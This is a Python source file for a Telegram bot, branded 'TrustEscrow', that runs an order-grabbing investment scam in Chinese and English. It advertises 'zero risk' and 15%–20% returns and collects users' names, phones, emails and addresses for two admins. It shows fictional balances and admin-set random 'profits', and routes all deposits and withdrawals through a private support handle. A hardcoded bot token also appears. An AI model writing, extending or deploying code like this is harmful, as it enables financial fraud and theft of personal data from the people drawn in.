# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random

# ===================== 核心配置（已替换为你的新Token） =====================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_IDS = [8781082053, 8256055083]
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 双语文案（高端吸睛版） =====================
TEXT = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障

✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報

客服：@fcff88""",

        "reg_title": """📝 入駐擔保申請
請依序填寫真實信息：
1. 真實姓名
2. 聯絡電話
3. 電子信箱
4. 居住地址
5. 推薦人ID""",

        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 可用餘額：{:.2f} USDT
📌 審核狀態：{}

⏳ 未完成訂單：
{}

✅ 已完成訂單：
{}""",

        "grab": """🚀 搶單大廳
隨機訂單｜搶單享5%利潤
🔥 小額常見，大額稀有！""",

        "deposit": """💰 儲值 & 提現
所有業務請聯繫官方客服：
➡️ @fcff88""",

        "record": """📜 擔保記錄
你的所有訂單明細，全程可查
{}""",

        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",

        "reg_success": "✅ 入駐申請已提交，等待管理員審核",
        "grab_success": "✅ 搶單成功！請前往個人中心接單",
        "accept_success": "✅ 接單成功！已從餘額扣除金額",
        "not_enough": "❌ 餘額不足，無法接單",
        "not_verified": "❌ 未通過審核，無法使用此功能",

        "admin_assign": "✅ 派單成功！已發送給用戶",
        "admin_done": "✅ 訂單已完成！利潤已發放給用戶",
        "admin_verify": "✅ 用戶審核通過！已解鎖全部功能",
        "btn_back": "返回首頁"
    },

    "en": {
        "home": """🏆 TrustEscrow Premium Escrow Platform
Safe Trading · Stable Profit · Zero Risk

✅ 5 Years 0 Fraud Record
✅ Professional Guarantor
✅ 100% Fund Escrow
✅ 5% Grab Order Profit
✅ 15%-20% Assign Order Return

Support: @fcff88""",

        "reg_title": """📝 Escrow Registration
Please fill in your real info:
1. Full Name
2. Phone Number
3. Email
4. Address
5. Referrer ID""",

        "profile": """👤 Profile
🆔 ID: {}
💰 Balance: {:.2f} USDT
📌 Status: {}

⏳ Pending Orders:
{}

✅ Completed Orders:
{}""",

        "grab": """🚀 Grab Order
Random High-Yield Orders · 5% Profit
🔥 Limited Daily, First Come First Served!""",

        "deposit": """💰 Deposit & Withdraw
All services via official support only
➡️ Support: @fcff88""",

        "record": """📜 Escrow Record
All your order details, fully traceable
{}""",

        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",

        "reg_success": "✅ Application Submitted! Waiting for admin review",
        "grab_success": "✅ Order Grabbed! Go to Profile to accept",
        "accept_success": "✅ Order Accepted! Amount deducted from balance",
        "not_enough": "❌ Insufficient USDT",
        "not_verified": "❌ Not Verified, Feature Unavailable",

        "admin_assign": "✅ Order Assigned! Sent to user",
        "admin_done": "✅ Order Completed! Profit sent to user",
        "admin_verify": "✅ User Verified! Full features unlocked",
        "btn_back": "Home"
    }
}

# ===================== 数据存储 =====================
user_lang = {}
user_step = {}
user_balance = {}
user_verify = {}  # 0=未申请 1=审核中 2=已通过
user_info = {}
orders = {}
order_id = 1

# ===================== 菜单生成 =====================
def main_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("入駐擔保" if lang == "zh" else "Register", callback_data="reg"),
        InlineKeyboardButton("個人中心" if lang == "zh" else "Profile", callback_data="profile"),
        InlineKeyboardButton("搶單大廳" if lang == "zh" else "Grab", callback_data="grab"),
        InlineKeyboardButton("儲值提現" if lang == "zh" else "Deposit", callback_data="deposit"),
        InlineKeyboardButton("擔保記錄" if lang == "zh" else "Record", callback_data="record"),
        InlineKeyboardButton("🌐 English" if lang == "zh" else "🌐 繁中", callback_data="lang"),
    )
    return m

def back_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
    return m

def accept_btn(oid):
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("接單", callback_data=f"accept_{oid}"))
    return m

# ===================== 通知管理员 =====================
def notify_admins(text):
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, text)
        except:
            pass

# ===================== /start 启动 =====================
@bot.message_handler(commands=["start"])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    user_step[u] = None
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    t = TEXT[user_lang[u]]
    bot.send_message(u, t["home"], reply_markup=main_menu(u))

# ===================== 按钮回调 =====================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    try:
        if c.data == "home":
            bot.send_message(u, t["home"], reply_markup=main_menu(u))

        elif c.data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            t = TEXT[user_lang[u]]
            bot.send_message(u, t["home"], reply_markup=main_menu(u))

        elif c.data == "reg":
            if user_verify.get(u, 0) == 0:
                user_step[u] = "reg_name"
                bot.send_message(u, t["reg_title"], reply_markup=back_menu(u))
            else:
                bot.answer_callback_query(c.id, "❌ 已提交申请/已通过审核", show_alert=True)

        elif c.data == "profile":
            pending = []
            completed = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    line = f"• #{oid}｜{o['amount']} USDT｜{'派單' if o['type'] == 'assign' else '搶單'}｜{s}"
                    if o["status"] == 2:
                        completed.append(line)
                    else:
                        pending.append(line)
            p_text = "\n".join(pending) if pending else "• 無"
            c_text = "\n".join(completed) if completed else "• 無"
            v_text = "審核中" if user_verify[u] == 1 else "已通過" if user_verify[u] == 2 else "未申請" if lang == "zh" else "Pending" if user_verify[u] == 1 else "Verified" if user_verify[u] == 2 else "Not Applied"
            text = t["profile"].format(u, user_balance.get(u, 0), v_text, p_text, c_text)
            bot.send_message(u, text, reply_markup=back_menu(u))

        elif c.data == "grab":
            if user_verify.get(u, 0) != 2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            global order_id
            amt = round(random.uniform(10, 50), 2)
            if random.random() < 0.15:
                amt = round(random.uniform(50, 100), 2)
            oid = order_id
            order_id += 1
            orders[oid] = {"user": u, "amount": amt, "type": "grab", "status": 0}
            bot.send_message(u, t["grab_success"], reply_markup=accept_btn(oid))

        elif c.data.startswith("accept_"):
            oid = int(c.data.split("_")[1])
            o = orders.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot.answer_callback_query(c.id, "❌ 訂單無效", show_alert=True)
                return
            if user_balance.get(u, 0) < o["amount"]:
                bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            user_balance[u] -= o["amount"]
            o["status"] = 1
            bot.send_message(u, t["accept_success"])

        elif c.data == "deposit":
            bot.send_message(u, t["deposit"], reply_markup=back_menu(u))

        elif c.data == "record":
            lines = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    lines.append(f"• #{oid}｜{o['amount']} USDT｜{'派單' if o['type'] == 'assign' else '搶單'}｜{s}")
            text = t["record"].format("\n".join(lines) if lines else "• 無記錄")
            bot.send_message(u, text, reply_markup=back_menu(u))

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(c.id)

# ===================== 用户消息处理（入驻流程） =====================
@bot.message_handler(func=lambda msg: msg.from_user.id not in ADMIN_IDS)
def user_msg(msg):
    u = msg.from_user.id
    cid = msg.chat.id
    txt = msg.text.strip()
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    user_info.setdefault(u, {})

    if u not in user_step:
        user_step[u] = None

    # 入驻流程 - 姓名
    if user_step[u] == "reg_name":
        user_info[u]["name"] = txt
        user_step[u] = "reg_phone"
        bot.send_message(cid, "請輸入聯絡電話：" if lang == "zh" else "Enter phone number:")

    # 入驻流程 - 电话
    elif user_step[u] == "reg_phone":
        user_info[u]["phone"] = txt
        user_step[u] = "reg_email"
        bot.send_message(cid, "請輸入電子信箱：" if lang == "zh" else "Enter email:")

    # 入驻流程 - 邮箱
    elif user_step[u] == "reg_email":
        user_info[u]["email"] = txt
        user_step[u] = "reg_addr"
        bot.send_message(cid, "請輸入居住地址：" if lang == "zh" else "Enter address:")

    # 入驻流程 - 地址
    elif user_step[u] == "reg_addr":
        user_info[u]["addr"] = txt
        user_step[u] = "reg_ref"
        bot.send_message(cid, "請輸入推薦人ID：" if lang == "zh" else "Enter referrer ID:")

    # 入驻流程 - 推荐人
    elif user_step[u] == "reg_ref":
        user_info[u]["ref"] = txt
        user_verify[u] = 1
        user_step[u] = None
        bot.send_message(cid, t["reg_success"], reply_markup=main_menu(u))
        # 通知双管理员
        notify_admins(f"""📥 新入驻申请
用户ID：{u}
姓名：{user_info[u]['name']}
电话：{user_info[u]['phone']}
邮箱：{user_info[u]['email']}
地址：{user_info[u]['addr']}
推荐人：{user_info[u]['ref']}
请审核：发送「审核通过 {u}」""")

# ===================== 管理员命令 =====================
@bot.message_handler(func=lambda msg: msg.from_user.id in ADMIN_IDS)
def admin_msg(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    parts = txt.split()
    t = TEXT["zh"]

    try:
        # 派单 用户ID 金额
        if parts[0] == "派单" and len(parts) == 3:
            target = int(parts[1])
            amt = float(parts[2])
            global order_id
            oid = order_id
            order_id += 1
            orders[oid] = {"user": target, "amount": amt, "type": "assign", "status": 0}
            bot.send_message(u, t["admin_assign"])
            bot.send_message(target, f"📥 你有新的派單 #{oid}｜{amt} USDT", reply_markup=accept_btn(oid))

        # 完成 订单号
        elif parts[0] == "完成" and len(parts) == 2:
            oid = int(parts[1])
            o = orders.get(oid)
            if not o:
                bot.send_message(u, "❌ 訂單不存在")
                return
            o["status"] = 2
            # 计算利润
            if o["type"] == "assign":
                profit = o["amount"] * random.uniform(0.15, 0.20)
            else:
                profit = o["amount"] * 0.05
            user_balance[o["user"]] += o["amount"] + profit
            bot.send_message(u, t["admin_done"])
            bot.send_message(o["user"], f"✅ 訂單 #{oid} 已完成！\n本金：{o['amount']} USDT\n利润：{round(profit, 2)} USDT\n总到账：{round(o['amount'] + profit, 2)} USDT")

        # 审核通过 用户ID
        elif parts[0] == "审核通过" and len(parts) == 2:
            target = int(parts[1])
            user_verify[target] = 2
            bot.send_message(u, t["admin_verify"])
            bot.send_message(target, "✅ 你的入駐已通過審核！已解鎖全部功能", reply_markup=main_menu(target))

    except Exception as e:
        bot.send_message(u, f"❌ 命令格式错误，请检查输入\n错误：{e}")

# ===================== 启动机器人 =====================
if __name__ == "__main__":
    print("✅ TrustEscrow 稳定版机器人启动成功")
    print(f"✅ 管理员ID：{ADMIN_IDS}")
    bot.infinity_polling()
